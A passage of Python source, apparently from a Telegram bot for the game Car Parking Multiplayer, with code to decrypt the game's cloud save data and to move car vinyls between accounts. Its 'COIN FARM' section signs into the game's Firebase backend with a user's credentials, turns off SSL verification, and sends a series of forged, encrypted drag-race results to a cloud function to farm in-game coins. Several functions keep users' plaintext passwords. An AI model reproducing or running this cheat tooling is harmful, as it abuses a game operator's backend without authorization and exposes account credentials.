"SavePlateVinyls22_1",\n)\nITEMS_PER_PAGE = 8\n_cars_function_name = None\n\n\nWAIT_MENU, WAIT_SRC, WAIT_TGT = range(3)\nsessions = defaultdict(dict)\n\nCAR_NAMES_JSON = {\n    "1":"BMW 135I","2":"VW scirocco","3":"BMW M5 2015","4":"OLD GWAGON","5":"Chevy camaro",\n    "6":"subaru brz","7":"lexus lfa","8":"infinity g36","9":"subie stinkeye","10":"Ferrari f12",\n    "11":"r34 skyline","12":"Evo 10","13":"ek9","14":"gtr r35","15":"audi rs4","17":"merc c63",\n    "18":"lambo huracan","19":"merc amg gtr","20":"audi tt","21":"jeep Wrangler","22":"BMW m6",\n    "23":"Hyundai Veloster","24":"Porsche panamera","25":"Bugatti Veyron","28":"Porsche Cayenne",\n    "29":"Honda Fn2","30":"BMW M5 99\'s","31":"BMW M5 05\'s","32":"Koenigsegg Agera",\n    "35":"Ford mustang shelby gt500","37":"Ford transit","39":"Dodge Charger 70\'s","40":"Corvette c7",\n    "41":"McLaren P1","42":"Lambo Aventador","43":"Lexuc is300","44":"Lambo Veneno","45":"BMW M5 97\'s",\n    "47":"S2000","48":"RX8","49":"Mk4 supra","51":"old Ferrari","53":"hakosuka gtr r31",\n    "54":"BMW M5 80\'S","55":"Hummer H1","56":"BMW M3 e93","57":"Cadillac CTS V","58":"Ferrari 458",\n    "59":"Smart fourtwo","60":"Cadillac Escalade","61":"Mercedes E series","62":"Dodge Charger",\n    "65":"Lambo Gallardo","66":"Chrysler 300c","70":"Scania Truck","74":"Peugeot 308","76":"BMW Z4",\n    "77":"Mini Cooper","81":"Subaru Hawkeye","82":"Evo 8","85":"Ford Ranger","86":"BMW X5",\n    "87":"Mercedes C series","88":"Iconic Bmw M3","89":"Hudson Hornet","99":"LADA",\n    "100":"Russian car","101":"Ford Trailer","102":"Russian car","103":"BMW M4 f82","104":"BMW M5 F90",\n    "105":"Dodge Challenger","106":"Old Mercedes E","107":"Audi R8 V10 old","108":"Audi quattro",\n    "109":"Porsche 911 991","110":"Range Rover SVR","111":"New nsx","112":"Mercedes E class",\n    "113":"Golf r mk7","114":"Mercedes S class","115":"Audi R8 V10 plus","116":"Mustang 5.0",\n    "117":"Audi s7","118":"BMW X6","119":"Hummer Military","120":"Toyota Camry","121":"Toyota lc200",\n    "123":"Mercedes gle","124":"Rolls Royce wraith","125":"Lambo Urus","126":"Gmc Sierra","127":"BMW M2",\n    "128":"Nissan S15","129":"Rx7","130":"Ford Gt","131":"Nissan 240sx","132":"Russian car",\n    "133":"Myvi Perodua m600","134":"toyota chaser","135":"audi rs6","136":"Mercedes E class",\n    "137":"Honda fd2","138":"BMW i8","139":"Ford crown Victoria","140":"Toyota Ae86","141":"Dodge Viper",\n    "142":"Mercedes c63","143":"Mercedes g63 new","145":"Nissan 350z","146":"Russian car",\n    "147":"Honda fk8","148":"Fastback mustang","149":"Oldies car","150":"supra mk5","151":"toyota velfire",\n    "152":"Russian car","153":"BMW M4 G82","154":"Toyota Hilux","155":"old f1","156":"r32 gtr",\n    "157":"golf r mk5","158":"mazda mx5","159":"Lambo SVJ","160":"Old Dodge Challenger",\n    "161":"jeep Cherokee","162":"McLaren 720s","163":"Mercedes convertible","164":"Dune buggy",\n    "165":"new f1","166":"Corvette c8","167":"Dodge Ram","168":"Bentley Continental","169":"Ford Explorer",\n    "170":"Peterbilt truck","171":"Scania truck","172":"Rolls Royce Cullinan","173":"Mercedes E class",\n    "175":"Mercedes E class","176":"Chevy pickup","177":"Nissan s13","178":"Bugatti Chiron SS",\n    "179":"Chevy","180":"Chevy pickup","181":"ford mustang old","182":"Drift truck hoonicorn",\n    "183":"Drift mustang","184":"Mitsubishi Eclipse","185":"Chevy Impala","186":"Astro Van",\n    "187":"Mazda Miata","188":"Porsche Gt3rs","189":"Ford Raptor","190":"Peugeot","191":"Bus 1",\n    "192":"Ram Trx","193":"M3 Touring","194":"Mercedes Slr","195":"Bus 2","196":"dodge old charger",\n    "197":"VW microbus","198":"Koenigsegg Jesko","199":"Corvette C6","200":"Dodge Durango",\n    "201":"Mercedes Clk gtr","202":"Pagani Zonda","204":"Mercede Van","205":"Porsche rwb",\n    "206":"Alfa Romeo Giulia","207":"Porsche Le mans","208":"Ford Bronco","209":"Lexus is300 2009",\n    "210":"Corvette C5","211":"Audi Rs7","212":"6x6 Mercedes g63","213":"Nissan R33",\n    "214":"Toyota Chaser mk2","215":"Chevy Tahoe","216":"McLaren Senna","217":"BMW X7",\n    "218":"Toyota Crown","219":"VW Passat","220":"Fairlady Z","221":"Old nsx","222":"Porsche 918",\n    "223":"DMC delorean","224":"Subaru Raptor eye","225":"Honda Delsol","226":"Fiat van","227":"Amg One",\n    "228":"Audi Rs2","229":"Ferrari F40","230":"Land Rover","231":"Toyota lc250 old","232":"Kia Stinger",\n    "233":"BMW i7","234":"Austin Martin","235":"Mustang","236":"RV","237":"Semi Truck",\n    "238":"BMW M5","239":"Escalade","240":"Ford focus","241":"La Ferrari","242":"Camaro",\n    "243":"Jeep gladiator","244":"Land Rover","245":"Toyota GR Yaris","248":"Russian Car",\n    "249":"Maybach","250":"Porsche Carrera GT","252":"bmw","257":"M2","258":"Mercedes",\n    "261":"new truck","264":"new Camry",\n}\n\ndef get_car_name(car_id):\n    return CAR_NAMES_JSON.get(str(car_id), f"Car {car_id}")\n\n# ============================================================\n# MEMORYPACK HELPERS\n# ============================================================\ndef _derive_key_iv(local_id):\n    if not local_id: return None, None\n    prefix = local_id[:8]\n    raw = (prefix + "12345678").encode("utf-8")[:16]\n    return raw, raw\n\ndef _encrypt_value(value, local_id):\n    key, iv = _derive_key_iv(local_id)\n    if not key or not iv: return None\n    raw = value.encode("utf-8")\n    padding = 16 - len(raw) % 16\n    raw += bytes([padding]) * padding\n    return base64.b64encode(AES.new(key, AES.MODE_CBC, iv).encrypt(raw)).decode("utf-8")\n\ndef _json_unwrap(value):\n    current = value\n    for _ in range(4):\n        if not isinstance(current, str): break\n        try: current = json.loads(current)\n        except: break\n    return current\n\ndef _int_value(value, default=0):\n    try: return int(value)\n    except: return default\n\ndef _float_value(value):\n    try:\n        n = float(value)\n        return n if math.isfinite(n) else 0.0\n    except: return 0.0\n\ndef _uint32_value(value): return _int_value(value) & 0xFFFFFFFF\ndef _int64_value(value):\n    n = _int_value(value)\n    if n > 0x7FFFFFFFFFFFFFFF: n -= 0x10000000000000000\n    if n < -0x8000000000000000: n = -0x8000000000000000\n    return n\n\ndef _memorypack_string(value):\n    encoded = value.encode("utf-8")\n    if not encoded: return struct.pack("<i", 0)\n    return struct.pack("<ii", ~len(encoded), len(value)) + encoded\n\ndef _vector3(value):\n    if not isinstance(value, dict): return 0.0, 0.0, 0.0\n    return (_float_value(value.get("x", value.get("X"))),\n            _float_value(value.get("y", value.get("Y"))),\n            _float_value(value.get("z", value.get("Z"))))\n\ndef _serialize_vinyl_item(item):\n    position = _vector3(item.get("position"))\n    scale_rotation = _vector3(item.get("scaleRotation", item.get("scale_rotation")))\n    icon_position = _vector3(item.get("iconPosition", item.get("icon_position")))\n    text = str(item.get("text") or "")\n    color = _uint32_value(item.get("color"))\n    packed_data = _int64_value(item.get("packedData"))\n    return (b"\\x06" + struct.pack("<9f", *position, *scale_rotation, *icon_position)\n            + _memorypack_string(text) + struct.pack("<Iq", color, packed_data))\n\ndef _serialize_vinyl_list(items):\n    return struct.pack("<i", len(items)) + b"".join(_serialize_vinyl_item(i) for i in items)\n\ndef _extract_vinyl_items(value):\n    if isinstance(value, list): return [i for i in value if isinstance(i, dict)]\n    if not isinstance(value, dict): return None\n    if isinstance(value.get("allVynils"), list): return [i for i in value["allVynils"] if isinstance(i, dict)]\n    if isinstance(value.get("oneVynil"), list): return [i for i in value["oneVynil"] if isinstance(i, dict)]\n    if {"position", "scaleRotation", "iconPosition"} & set(value): return [value]\n    return None\n\ndef _brotli_decompress(payload):\n    if brotli is None: return None\n    try: return brotli.decompress(payload)\n    except: return None\n\ndef _extract_vinyl_raw_candidate(payload):\n    direct = _read_memorypack_vinyl_list(payload, 0, len(payload))\n    if direct is not None and direct[0] == len(payload): return payload, direct[1]\n    if not payload: return None\n    wrapped = _read_memorypack_vinyl_list(payload, 1, len(payload))\n    if wrapped is None: return None\n    remainder = len(payload) - wrapped[0]\n    if remainder in (0, 4): return payload[1:wrapped[0]], wrapped[1]\n    return None\n\ndef _normalize_cpm1_vinyl_field(value):\n    items = _extract_vinyl_items(value)\n    if items is not None: return _serialize_vinyl_list(items), len(items)\n    if value in (None, "", []): return _serialize_vinyl_list([]), 0\n    if not isinstance(value, str): return None\n    try: decoded = base64.b64decode(value, validate=True)\n    except: return None\n    for candidate in (decoded, _brotli_decompress(decoded)):\n        if not isinstance(candidate, (bytes, bytearray)): continue\n        parsed = _extract_vinyl_raw_candidate(bytes(candidate))\n        if parsed is not None: return parsed\n    return None\n\ndef _instance_id_from_car(car):\n    texts = car.get("texts")\n    if isinstance(texts, list):\n        for index in (2, 1, 0):\n            if index < len(texts):\n                value = str(texts[index] or "").strip()\n                if value: return value\n    return ""\n\ndef _normalize_cpm1_car(raw_car, index, names):\n    if not isinstance(raw_car, dict): return None\n    car_id = _int_value(raw_car.get("CarID"))\n    if car_id <= 0: return None\n    vinyls = _normalize_cpm1_vinyl_field(raw_car.get("Vynils"))\n    window = _normalize_cpm1_vinyl_field(raw_car.get("WindowVinyls"))\n    supported = vinyls is not None and window is not None\n    return {"id": car_id, "index": index, "name": names.get(str(car_id), f"Car {car_id}"),\n            "instance_id": _instance_id_from_car(raw_car), "transferable": supported,\n            "style_transferable": supported,\n            "vinyls": vinyls[1] if vinyls else -1, "window": window[1] if window else -1,\n            "vinyls_raw": vinyls[0] if vinyls else None, "window_raw": window[0] if window else None}\n\ndef _memorypack_xor_key(local_id):\n    chars = list(local_id or "")\n    if len(chars) >= 7: chars[6], chars[4] = chars[4], chars[6]\n    if len(chars) >= 9: chars.pop(8)\n    if chars: chars.append(chars[0])\n    return "".join(chars).encode("utf-8")\n\n_B64_TEXT = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\\r\\n"\n\ndef _decode_current_memorypack(value, local_id):\n    if not isinstance(value, dict) or value.get("code") != 1 or not isinstance(value.get("data"), str):\n        return None\n    if brotli is None: return None\n    try:\n        encrypted = base64.b64decode("".join(value["data"].split()), validate=True)\n        for _ in range(2):\n            if not encrypted or any(chr(b) not in _B64_TEXT for b in encrypted[:256]): break\n            try: encrypted = base64.b64decode(encrypted.translate(None, b"\\r\\n"), validate=True)\n            except: break\n        xor_key = _memorypack_xor_key(local_id)\n        if not xor_key: return None\n        packed = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(encrypted))\n        return brotli.decompress(packed)\n    except: return None\n\ndef _read_memorypack_string(payload, offset, end):\n    if offset + 4 > end: return None\n    marker = struct.unpack_from("<i", payload, offset)[0]\n    offset += 4\n    if marker == -1 or marker == 0: return offset\n    if marker > 0: byte_count = marker * 2\n    else:\n        byte_count = ~marker\n        if offset + 4 > end: return None\n        offset += 4\n    if byte_count < 0 or offset + byte_count > end: return None\n    return offset + byte_count\n\ndef _decode_memorypack_string_at(payload, offset, end):\n    if offset + 4 > end: return None\n    marker = struct.unpack_from("<i", payload, offset)[0]\n    cursor = offset + 4\n    if marker in (-1, 0): return cursor, ""\n    if marker > 0:\n        byte_count = marker * 2\n        if cursor + byte_count > end: return None\n        try: return cursor + byte_count, payload[cursor:cursor+byte_count].decode("utf-16-le")\n        except: return None\n    byte_count = ~marker\n    if cursor + 4 + byte_count > end: return None\n    char_count = struct.unpack_from("<i", payload, cursor)[0]\n    cursor += 4\n    try: value = payload[cursor:cursor+byte_count].decode("utf-8")\n    except: return None\n    if char_count >= 0 and len(value) != char_count: return None\n    return cursor + byte_count, value\n\ndef _read_memorypack_vinyl(payload, offset, end):\n    if offset >= end: return None\n    member_count = payload[offset]; offset += 1\n    if member_count == 255: return offset\n    if member_count != 6 or offset + 36 > end: return None\n    values = struct.unpack_from("<9f", payload, offset)\n    if not all(math.isfinite(v) and abs(v) < 1_000_000 for v in values): return None\n    offset += 36\n    offset = _read_memorypack_string(payload, offset, end)\n    if offset is None or offset + 12 > end: return None\n    return offset + 12\n\ndef _read_memorypack_vinyl_list(payload, offset, end):\n    if offset + 4 > end: return None\n    count = struct.unpack_from("<i", payload, offset)[0]\n    offset += 4\n    if count == -1: return offset, 0\n    if count < 0 or count > 2000: return None\n    for _ in range(count):\n        offset = _read_memorypack_vinyl(payload, offset, end)\n        if offset is None: return None\n    return offset, count\n\ndef _read_memorypack_int_list(payload, offset, end):\n    if offset + 4 > end: return None\n    count = struct.unpack_from("<i", payload, offset)[0]\n    offset += 4\n    if count == -1: return offset\n    if count < 0 or count > 1000 or offset + count * 4 > end: return None\n    return offset + count * 4\n\ndef _read_memorypack_installed_body_kits(payload, offset, end):\n    if offset >= end: return None\n    member_count = payload[offset]; offset += 1\n    if member_count == 255: return offset\n    if member_count != 10 or offset + 32 > end: return None\n    offset += 32\n    trims_start = offset\n    offset = _read_memorypack_int_list(payload, offset, end)\n    if offset is None: offset = _read_memorypack_string(payload, trims_start, end)\n    if offset is None or offset + 4 > end: return None\n    return offset + 4\n\ndef _read_memorypack_body_kit_colors(payload, offset, end):\n    if offset >= end: return None\n    member_count = payload[offset]; offset += 1\n    if member_count == 255: return offset\n    if member_count != 1 or offset + 4 > end: return None\n    count = struct.unpack_from("<i", payload, offset)[0]; offset += 4\n    if count == -1: return offset\n    if count < 0 or count > 128: return None\n    for _ in range(count):\n        if offset >= end: return None\n        item_members = payload[offset]; offset += 1\n        if item_members == 255: continue\n        if item_members not in (2, 3) or offset + 12 > end: return None\n        offset += 12\n    return offset\n\ndef _read_memorypack_colors(payload, offset, end):\n    if offset >= end: return None\n    member_count = payload[offset]; offset += 1\n    if member_count == 255: return offset\n    if member_count != 8 or offset + 32 > end: return None\n    offset += 32\n    return _read_memorypack_body_kit_colors(payload, offset, end)\n\ndef _read_memorypack_bought_body_kits(payload, offset, end):\n    if offset >= end: return None\n    member_count = payload[offset]; offset += 1\n    if member_count == 255: return offset\n    if member_count != 10: return None\n    for _ in range(10):\n        offset = _read_memorypack_int_list(payload, offset, end)\n        if offset is None: return None\n    return offset\n\ndef _memorypack_car_offsets(payload):\n    if len(payload) < 4: return None\n    expected_count = struct.unpack_from("<i", payload, 0)[0]\n    if expected_count == 0: return []\n    if expected_count < 0 or expected_count > 5000: return None\n    known_ids = {int(c) for c in CAR_NAMES_JSON if str(c).isdigit()}\n    known, broad = [], []\n    for offset in range(4, len(payload) - 5):\n        if payload[offset] != 9 or payload[offset + 5] not in (10, 255): continue\n        car_id = struct.unpack_from("<i", payload, offset + 1)[0]\n        if 0 < car_id <= 5000:\n            broad.append((offset, car_id))\n            if car_id in known_ids: known.append((offset, car_id))\n    if len(known) == expected_count: return known\n    if len(broad) == expected_count: return broad\n    confirmed = []\n    for offset, car_id in broad:\n        installed_end = _read_memorypack_installed_body_kits(payload, offset + 5, len(payload))\n        if installed_end is None: continue\n        if _read_memorypack_colors(payload, installed_end, len(payload)) is None: continue\n        confirmed.append((offset, car_id))\n    if len(confirmed) == expected_count: return confirmed\n    if broad and len(confirmed) == len(broad) and _car_records_span_payload(payload, confirmed):\n        return confirmed\n    return None\n\ndef _car_records_span_payload(payload, records):\n    starts = [o for o, _ in records] + [len(payload)]\n    for i in range(len(records)):\n        start, end = starts[i], starts[i+1]\n        for offset in range(start + 5, max(start + 6, end - 7)):\n            first = _read_memorypack_vinyl_list(payload, offset, end)\n            if first is None: continue\n            second = _read_memorypack_vinyl_list(payload, first[0], end)\n            if second is not None and second[0] == end: break\n        else: return False\n    return True\n\ndef _find_memorypack_car_instance(payload, start, vinyl_offset):\n    strict = re.compile(r"^[A-Za-z]{2}\\d{3,}_[A-Za-z]{2}\\d{2,}_\\d{2,}$")\n    fallback = None\n    for offset in range(start + 5, max(start + 5, vinyl_offset - 3)):\n        decoded = _decode_memorypack_string_at(payload, offset, vinyl_offset)\n        if decoded is None: continue\n        end, text = decoded\n        if not (8 <= len(text) <= 80 and text.count("_") >= 2 and any(c.isdigit() for c in text)): continue\n        raw = payload[offset:end]\n        if strict.fullmatch(text): return text, raw\n        if fallback is None and re.fullmatch(r"[A-Za-z0-9_-]+", text): fallback = (text, raw)\n    return fallback\n\ndef _extract_memorypack_style_fields(payload, start, end, vinyl_offset, instance_raw):\n    installed_start = start + 5\n    installed_end = _read_memorypack_installed_body_kits(payload, installed_start, end)\n    if installed_end is None: return None\n    colors_start = installed_end\n    colors_end = _read_memorypack_colors(payload, colors_start, end)\n    if colors_end is None: return None\n    instance_start = payload.find(instance_raw, colors_end, vinyl_offset)\n    if instance_start < 0: return None\n    instance_end = instance_start + len(instance_raw)\n    bought_candidates = [o for o in range(instance_end, vinyl_offset)\n                          if _read_memorypack_bought_body_kits(payload, o, vinyl_offset) == vinyl_offset]\n    if not bought_candidates: return None\n    bought_start = max(bought_candidates)\n    if not (colors_end < instance_start < instance_end < bought_start < vinyl_offset): return None\n    return {2: payload[bought_start:vinyl_offset], 3: payload[colors_start:colors_end],\n            4: payload[instance_end:bought_start], 5: payload[colors_end:instance_start],\n            6: payload[installed_start:installed_end]}\n\ndef _parse_memorypack_cloud_vinyls(value, local_id):\n    payload = _decode_current_memorypack(value, local_id)\n    if payload is None: return None\n    records = _memorypack_car_offsets(payload)\n    if records is None: return None\n    result = []\n    for index, (start, car_id) in enumerate(records):\n        end = records[index+1][0] if index+1 < len(records) else len(payload)\n        match = None\n        for offset in range(start + 5, max(start + 5, end - 7)):\n            first = _read_memorypack_vinyl_list(payload, offset, end)\n            if first is None: continue\n            second = _read_memorypack_vinyl_list(payload, first[0], end)\n            if second is not None and second[0] == end:\n                c = (first[1], second[1], offset, first[0])\n                if match is None or (c[0]+c[1], c[2]) > (match[0]+match[1], match[2]): match = c\n        car = {"index": index, "id": car_id, "vinyls": match[0] if match else -1,\n               "window": match[1] if match else -1, "transferable": False,\n               "fingerprint": hashlib.sha256(payload[start:end]).hexdigest()}\n        if match is not None:\n            instance = _find_memorypack_car_instance(payload, start, match[2])\n            if instance is not None:\n                iid, iraw = instance\n                style = _extract_memorypack_style_fields(payload, start, end, match[2], iraw)\n                car.update({"instance_id": iid, "car_id_raw": payload[start+1:start+5],\n                            "instance_raw": iraw, "vinyls_raw": payload[match[2]:match[3]],\n                            "window_raw": payload[match[3]:end], "style_fields": style,\n                            "style_transferable": style is not None, "transferable": True})\n        result.append(car)\n    return result\n\ndef _parse_cpm1_memorypack_vinyls(payload):\n    records = _memorypack_car_offsets(payload)\n    if records is None: return None\n    result = []\n    for index, (start, car_id) in enumerate(records):\n        end = records[index+1][0] if index+1 < len(records) else len(payload)\n        match = None\n        for offset in range(start + 5, end - 10):\n            first = _read_memorypack_vinyl_list(payload, offset, end)\n            if first is None: continue\n            second = _read_memorypack_vinyl_list(payload, first[0], end)\n            if second is not None:\n                c = (first[1], second[1], offset, first[0], second[0])\n                if match is None or (c[0]+c[1]) > (match[0]+match[1]): match = c\n        transferable = match is not None\n        result.append({"id": car_id, "index": index, "name": get_car_name(car_id),\n                       "transferable": transferable, "style_transferable": transferable,\n                       "vinyls": match[0] if match else -1, "window": match[1] if match else -1,\n                       "vinyls_raw": payload[match[2]:match[3]] if match else None,\n                       "window_raw": payload[match[3]:match[4]] if match else None})\n    return result\n\n# ============================================================\n# COIN FARM (PhoenixCrypto)\n# ============================================================\nclass PhoenixCrypto:\n    def __init__(self, uid):\n        self.key = (uid[:8] + KEY_ADD).encode()[:16]\n        self.iv = (uid[:8] + IV_ADD).encode()[:16]\n    def encrypt(self, text):\n        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)\n        return base64.b64encode(cipher.encrypt(pad(str(text).encode(), 16))).decode()\n    def decrypt(self, text):\n        try:\n            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)\n            return unpad(cipher.decrypt(base64.b64decode(text)), 16).decode()\n        except: return None\n\nasync def farm_login_async(email, password):\n    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={CPM2_API_KEY}"\n    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as s:\n        async with s.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=aiohttp.ClientTimeout(total=20)) as r:\n            data = await r.json()\n            if "idToken" in data: return data["idToken"], data["localId"]\n    return None, None\n\nasync def farm_get_coins(token, uid):\n    crypto = PhoenixCrypto(uid)\n    headers = {"Content-Type": "application/json", "Authorization": "Bearer " + token}\n    url = CF_BASE + "/GetCoins24_1"\n    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as s:\n        async with s.post(url, headers=headers, json={"data": None}) as r:\n            if r.status == 200:\n                result = await r.json()\n                rd = result.get("result")\n                if isinstance(rd, dict) and "data" in rd:\n                    dec = crypto.decrypt(rd["data"])\n                    if dec and dec.isdigit(): return int(dec)\n    return 0\n\nasync def farm_coins(token, uid):\n    crypto = PhoenixCrypto(uid)\n    total, success, ops = 0, 0, 0\n    combos = [(c, p, g) for c in range(6) for p in range(1, 4) for g in range(2)]\n    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as s:\n        for c, p, g in combos:\n            enc = crypto.encrypt(f"{c},{p},{g}")\n            headers = {"Content-Type": "application/json", "Authorization": "Bearer " + token}\n            url = CF_BASE + "/SetDragRacing23_1"\n            try:\n                async with s.post(url, headers=headers, data=json.dumps({"data": enc}), timeout=aiohttp.ClientTimeout(total=30)) as r:\n                    if r.status == 200:\n                        text = await r.text()\n                        try: result = json.loads(text).get("result")\n                        except: result = None\n                        coins = 0\n                        if isinstance(result, str):\n                            try:\n                                p2 = json.loads(result)\n                                if isinstance(p2, list) and len(p2) >= 2:\n                                    dec = crypto.decrypt(p2[1]) if isinstance(p2[1], str) else None\n                                    if dec and dec.isdigit(): coins = int(dec)\n                            except: pass\n                        elif isinstance(result, list) and len(result) >= 2:\n                            dec = crypto.decrypt(result[1]) if isinstance(result[1], str) else None\n                            if dec and dec.isdigit(): coins = int(dec)\n                        if coins > 0:\n                            total += coins\n                            success += 1\n                        ops += 1\n            except: ops += 1\n            await asyncio.sleep(0.05)\n    return success, ops, total\n\n# ============================================================\n# API HELPERS\n# ============================================================\nasync def firebase_verify_password(email, password, api_key, session=None):\n    if not api_key: return {"error": {"message": "NO_API_KEY"}}\n    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"\n    async def request(s):\n        try:\n            async with s.post(url, json={"email": email, "password": password, "returnSecureToken": True},\n                              timeout=aiohttp.ClientTimeout(total=15)) as r:\n                try: data = await r.json(content_type=None)\n                except: return {"error": {"message": "SERVICE_UNAVAILABLE", "transient": True}}\n                if r.status == 429 or r.status >= 500:\n                    return {"error": {"message": "SERVICE_UNAVAILABLE", "transient": True}}\n                return data\n        except: return {"error": {"message": "CONNECTION_ERROR", "transient": True}}\n    if session: return await request(session)\n    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as own: return await request(own)\n\ndef _cpm1_function_bases():\n    seen, result = set(), []\n    for b in (CPM1_API_BASE, *CPM1_FALLBACK_BASES):\n        b = str(b or "").strip().rstrip("/")\n        if b and b not in seen: seen.add(b); result.append(b)\n    return tuple(result)\n\nasync def _call_cpm1_function(function_name, id_token, local_id, session):\n    headers = {"Authorization": f"Bearer {id_token}", "Content-Type": "application/json"}\n    encrypted_payload = _encrypt_value(json.dumps({}), local_id)\n    if not encrypted_payload: return None, "ENCRYPT_FAILED"\n    last_error = ""\n    for base in _cpm1_function_bases():\n        try:\n            async with session.post(f"{base}/{function_name}", json={"data": encrypted_payload},\n                                    headers=headers, timeout=aiohttp.ClientTimeout(total=25)) as r:\n                try: body = await r.json(content_type=None)\n                except: body = await r.text()\n                if r.status != 200:\n                    last_error = f"{function_name}@{base}:HTTP_{r.status}"; continue\n                if not isinstance(body, dict) or "result" not in body:\n                    last_error = f"{function_name}@{base}:BAD_BODY"; continue\n                return _json_unwrap(body.get("result")), ""\n        except Exception as e:\n            last_error = f"{function_name}@{base}:{type(e).__name__}"\n    return None, last_error\n\nasync def _read_cpm1_current_cloud(id_token, local_id, session):\n    raw, error = await _call_cpm1_function(CPM1_CARS_FUNCTION, id_token, local_id, session)\n    if error: return None, error\n    if not isinstance(raw, list): return None, "INVALID_RESPONSE"\n    names = {k: v for k, v in CAR_NAMES_JSON.items()}\n    cars = [n for i, c in enumerate(raw) if (n := _normalize_cpm1_car(c, i, names)) is not None]\n    if not cars: return None, "EMPTY"\n    # Prefer style-transferable, but still return cars that have vinyl payloads\n    if any(c.get("style_transferable") for c in cars): return cars, ""\n    if any(isinstance(c.get("vinyls_raw"), (bytes, bytearray)) for c in cars): return cars, ""\n    if any(c.get("transferable") or (c.get("vinyls") or 0) > 0 for c in cars): return cars, ""\n    return None, "NO_SUPPORTED_VINYLS"\n\nasync def _read_cpm1_rtdb(id_token, local_id, session):\n    headers = {"Authorization": f"Bearer {id_token}"}\n    paths = [f"/users/{local_id}/OneCar.json", f"/OneCar/{local_id}.json",\n             f"/users/{local_id}/cars.json", f"/users/{local_id}/garage.json", f"/cars/{local_id}.json"]\n    for path in paths:\n        url = f"{CPM1_DATABASE_URL}{path}"\n        try:\n            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as r:\n                text = await r.text()\n                if r.status == 200 and text and text.strip() != "null":\n                    try: value = json.loads(text)\n                    except: value = text.strip().strip(\'"\')\n                    if isinstance(value, str) and len(value) > 10:\n                        try: return base64.b64decode(value), ""\n                        except: return None, "BASE64_ERROR"\n                    if value and value != "null": return None, f"UNEXPECTED:{type(value).__name__}"\n                elif r.status == 401: return None, "AUTH_EXPIRED"\n        except: pass\n    return None, "NOT_FOUND"\n\nasync def open_cpm1_cloud_session(email, password):\n    result = {"cars": None, "error": "", "email": email, "password": password}\n    auth = await firebase_verify_password(email, password, CPM1_API_KEY)\n    if "error" in auth:\n        result["error"] = str(auth["error"].get("message", "AUTH_ERROR")); return result\n    id_token, local_id = auth.get("idToken"), auth.get("localId")\n    if not id_token or not local_id:\n        result["error"] = "INVALID_AUTH"; return result\n    result["local_id"] = local_id; result["id_token"] = id_token\n    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:\n        cars, err = await _read_cpm1_current_cloud(id_token, local_id, session)\n        if cars is not None:\n            result["cars"] = cars; result["cloud_source"] = "callable"; return result\n        raw, rtdb_err = await _read_cpm1_rtdb(id_token, local_id, session)\n        if raw is not None:\n            legacy = _parse_cpm1_memorypack_vinyls(raw)\n            if legacy is not None:\n                result["cars"] = legacy; result["cloud_source"] = "rtdb"; return result\n    result["error"] = "CPM1_UNSUPPORTED"\n    return result\n\nasync def _call_function(function_name, id_token, local_id):\n    encrypted_payload = _encrypt_value(json.dumps({}), local_id)\n    if not encrypted_payload: return False, None\n    headers = {"Authorization": f"Bearer {id_token}", "Content-Type": "application/json"}\n    try:\n        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20)) as s:\n            async with s.post(f"{CPM2_API_BASE}/{function_name}", json={"data": encrypted_payload},\n                              headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as r:\n                try: body = await r.json(content_type=None)\n                except: return False, None\n                if r.status != 200 or not isinstance(body, dict) or "result" not in body: return False, None\n                result = body.get("result")\n                if isinstance(result, str):\n                    try: result = json.loads(result)\n                    except: pass\n                return True, result\n    except: return False, None\n\nasync def _call_function_payload(function_name, id_token, payload, session):\n    headers = {"Authorization": f"Bearer {id_token}", "Content-Type": "application/json"}\n    try:\n        async with session.post(f"{CPM2_API_BASE}/{function_name}", json={"data": payload},\n                                headers=headers, timeout=aiohttp.ClientTimeout(total=30)) as r:\n            try:\n                body = await r.json(content_type=None)\n            except Exception:\n                text_body = await r.text()\n                return False, {"error": "BAD_JSON", "status": r.status, "text": str(text_body)[:150]}\n            if r.status != 200:\n                return False, {"error": "HTTP_%s" % r.status, "body": body}\n            if not isinstance(body, dict) or "result" not in body:\n                return False, body if isinstance(body, dict) else {"error": "BAD_BODY", "status": r.status}\n            result = body.get("result")\n            if isinstance(result, str):\n                try:\n                    parsed = json.loads(result)\n                    if parsed is not None:\n                        result = parsed\n                except Exception:\n                    pass\n            err = _function_result_error_code(result)\n            if err is not None:\n                return False, result if isinstance(result, dict) else {"error": err, "result": result}\n            return True, result\n    except Exception as e:\n        return False, {"error": type(e).__name__, "message": str(e)[:120]}\n\ndef _function_result_error_code(result):\n    if isinstance(result, (int, float)) and not isinstance(result, bool):\n        return None if result == 1 else int(result) if float(result).is_integer() else str(result)\n    if isinstance(result, str) and result.strip().lstrip("-").isdigit():\n        n = int(result.strip()); return None if n == 1 else n\n    if not isinstance(result, dict): return None\n    code = result.get("code")\n    if code is not None:\n        try: nc = int(code)\n        except: nc = str(code)\n        if nc != 1: return nc\n    if result.get("success") is False: return "success=false"\n    if result.get("error"): return str(result["error"])\n    return None\n\nasync def _read_raw_cars(id_token, local_id):\n    global _cars_function_name\n    if _cars_function_name:\n        try:\n            ok, value = await _call_function(_cars_function_name, id_token, local_id)\n            if ok: return value\n        except: pass\n    for fn in CPM2_CARS_FUNCTION_CANDIDATES:\n        try:\n            ok, value = await _call_function(fn, id_token, local_id)\n            if ok:\n                _cars_function_name = fn\n                return value\n        except: continue\n    return None\n\nasync def _authenticate_cpm2(email, password, session):\n    auth = await firebase_verify_password(email, password, CPM2_API_KEY, session=session)\n    id_token = str(auth.get("idToken") or "")\n    local_id = str(auth.get("localId") or "")\n    error = str((auth.get("error") or {}).get("message") or "AUTH_FAILED")\n    return id_token, 